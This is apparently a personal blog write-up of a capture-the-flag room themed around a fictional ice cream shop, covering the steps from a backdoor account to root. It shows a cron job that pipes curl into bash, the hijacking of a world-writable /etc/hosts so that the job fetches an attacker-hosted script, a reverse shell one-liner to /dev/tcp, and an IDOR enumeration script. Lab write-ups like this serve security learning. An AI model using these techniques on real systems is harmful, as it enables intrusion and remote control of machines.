---
layout: post
author: d3r3lict
---
# The story
The vigilante hacker and Vim enthusiast has enlisted you for help! He's been tipped off that the enigmatic ice cream shop owner Chad Cherry and his creamy crew are up to something nefarious: they plan to use their totally legit business to rid the world of the greatest text editor, Vim, and replace it with their preferred editor Nano! You'll need to hack into the ice cream shop and escalate your privileges to take them down! Jex has already gained initial access and has created a backdoor account to help you out.


Jex has set up a backdoor account for you to use to get started.

Username: notsus

Password: dontbeascriptkiddie

# Bob-Boba
First of all we need to add the target into hosts file as instructed.
Then I logged in via SSH, let's see what we can do.
After doing some enumeration I found the following in `crontab`.
```
*  *    * * *   bob-boba curl cherryontop.tld:8000/home/bob-boba/coinflip.sh | bash
```
But can we edit `/etc/hosts` to get a shell?
```
$ ls -l /etc/hosts
-rw-rw-rw- 1 root adm 312 Apr  8  2023 /etc/hosts
```
Great, we can!
That means we can force the `target machine` to identify the `our attacker machine` as `cherryontop.tld`, so we can put a payload into `coinflip.sh` and get a shell.
```
echo "MACHINE_IP cherryontop.tld" >> /etc/hosts
```
After this I've made exactly the same directory tree and put `coinflip.sh` there, so it looks like `/home/kali/Desktop/nanocherryctf/home/bob-boba/coinflip.sh`.
Now we can inject a `reverse shell` payload into that `.sh` file and run our http.server in `/home/kali/Desktop/nanocherryctf/` directory.
```
┌──(kali㉿kali)-[~/Desktop]
└─$ echo "sh -i >& /dev/tcp/MACHINE_IP/9001 0>&1" > nanocherryctf/home/bob-boba/coinflip.sh
```
```
┌──(kali㉿kali)-[~/Desktop/nanocherryctf]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
After a while I got a shell, and a part of `Chad Cherry's` password.

# Molly-Milk / WEB
After doing some enumeration using linpeas I found this.
```
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        ServerName nano.cherryontop.thm
        ServerAlias nano.cherryontop.thm
        DocumentRoot /var/www/b.cherryontop.thm
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```
So there is an `nano` subdomain, huh? 
Let's see what's there.
This one took a lot of time, but after adding .db in desired extensions for `dirbuster` I saw this.
```
File found: /users.db - 200
```
Let's download that file and see what's in there. Using these credentials I logged in into admin panel of the website.
Here I got the first flag and Molly's SSH password. I logged in as molly-milk and found the second part of Chad's password.

# Sam-Sprinkles
This one took even more time.
There is a page which tells us some facts about ice cream. Let's take a look at it.
Here it is `http://cherryontop.thm/content.php?facts=1&user=I52WK43U`.
I was trying to find an SQL injection or LFI, but there was no success, but maybe an IDOR? 
Let's write a simple python script to check that, it says `dontbeascriptkiddie`, right?

Here is the script
```
import requests

url="http://cherryontop.thm/content.php?facts={}&user=I52WK43U"

for i in range(1,1000):
        response = requests.get(url=url.format(i))
        if "<b>" in response.text:
                print(i)
```

Woah, looks like we found something?
```
┌──(kali㉿kali)-[~]
└─$ python3 script.py
1
2
3
4
20
43
50
64
```
Not really, it says 'no easter eggs for `you`', also it asks `who we are`. 
I've analysed the string `I52WK43U` using cyberchef, and found out that it is Base32 encoded string which stands for `Guest`. 
We hacked everyone except Sam and Chad, and in order to hack Chad we should hack Sam first to get the last part of Chad's password. 
So obviously we are targeting Sam right now, right?
I modified the link in my code a lil bit, so now parameter `user` contains Base32 encoded string of Sam's username.
```
┌──(kali㉿kali)-[~]
└─$ python3 script.py
1
2
3
4
20
43
50
64
```
Nothing changes???
Well, I wouldn't add this part in my writeup if it was completely useless :)
While checking facts under those numbers I found Sam's SSH credentials.

# Chad-Cherry
I've claimed the last part of Chad's password and logged in as Chad-Cherry!
`Hello.txt` file says we will get the root password from `.wav` file, so let's get that file to our machine and look what we can do to it.

# Root
The first guess of mine was `Audio Steganography`, so I installed `Audacity` to find out. Well, I was wrong.
Let me be honest, this one was something I couldn't solve, so I checked another writeup.
It contains [SSTV][sstv-information] signal, and we need [This tool][sstv-tool] to extract the data.

```
$ git clone https://github.com/colaclanth/sstv.git
$ python setup.py install
```
Then we can extract the image from the audio using    
```
$ sstv -d rootPassword.raw -o image.jpg
```
And finally I logged in as root and got the last answer :)

It was an amazing room with an amazing story. I'm really impressed on how much effort and time they put into it, because it was interesting, challenging, and funny. Many thanks to everyone who was participating in creation of this room <3

[sstv-tool]: https://github.com/colaclanth/sstv
[sstv-information]: https://en.wikipedia.org/wiki/Slow-scan_television

